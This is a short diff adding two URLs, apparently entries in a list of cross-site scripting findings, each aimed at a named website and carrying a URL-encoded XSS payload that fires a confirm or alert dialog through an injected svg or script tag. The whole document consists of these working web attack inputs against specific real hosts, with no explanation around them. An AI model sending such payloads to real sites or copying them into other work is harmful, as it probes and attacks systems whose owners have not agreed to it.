@@ -1,0 +1,2 @@
+http://deprecated.drinkware.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
+http://dfxserv.de/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
